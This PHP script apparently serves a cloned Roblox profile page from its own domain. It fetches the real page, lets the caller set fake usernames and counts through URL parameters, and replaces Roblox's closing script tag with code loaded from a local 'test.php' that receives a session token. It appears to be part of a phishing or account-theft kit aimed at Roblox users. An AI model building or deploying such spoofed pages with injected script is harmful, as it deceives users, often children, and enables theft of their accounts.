<?php
//
function requestId($username)
{
    $getId = request("https://api.roblox.com/users/get-by-username?username=$username");
    if (strpos($getId, 'Id') !== false) {
        $idDecode = json_decode($getId);
        $id = $idDecode->Id;
        return $id;
    } else {
        return "Not Exist";
    }
    return;
}
//
if($_GET["token"]){
    $userid = "1";
    $session = htmlspecialchars($_GET["token"]);

    $realUsername = htmlspecialchars($_GET["realusername"]);
    $fakeUsername = htmlspecialchars($_GET["fakeusername"]);

    $friendsCount = htmlspecialchars($_GET["friendscount"]);
    $followersCount = htmlspecialchars($_GET["followerscount"]);
    $followingsCount = htmlspecialchars($_GET["followingscount"]);
    $placevisitsCount = htmlspecialchars($_GET["placevisitscount"]);

    $aboutmsg = htmlspecialchars($_GET["aboutmsg"]);
    $accountcreated = htmlspecialchars($_GET["accountcreated"]);

    $domain = 'http://'.$_SERVER["SERVER_NAME"];
$catalog = file_get_contents("https://www.roblox.com/users/1/profile");
$shit = file_get_contents("$domain/cors/ios.txt");
$shit1 = file_get_contents("$domain/cors/ioss.txt");
$shit2 = file_get_contents("$domain/cors/iosss.txt");
$apicors = file_get_contents("$domain/cors/apis.txt");
$apicorswith = file_get_contents($domain."/cors/apis.php");
$lmao = file_get_contents("$domain/cors/omg.txt");
$lmaowith = file_get_contents("$domain/cors/omgwith.php?userid=$userid");
$fuckingshitlist = file_get_contents("$domain/cors/shitlist.txt");
$fuckingshitlistwith = file_get_contents($domain."/cors/shitlistwith.php?userid=$userid");



$str = str_replace($shit, NULL, $catalog);
$str = str_replace($shit1, NULL, $str);
$str = str_replace($shit2, NULL, $str);
$str = str_replace($apicors, $apicorswith, $str);
$str = str_replace($fuckingshitlist, $fuckingshitlistwith, $str);
$str = str_replace($lmao, $lmaowith, $str);
$sex = file_get_contents("$domain/cors/test.php?session=$session");
$str = str_replace("<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/f0e76b2105ea17333de8010245aa5168.js'></script>", $sex, $str);
echo $str;

}
?>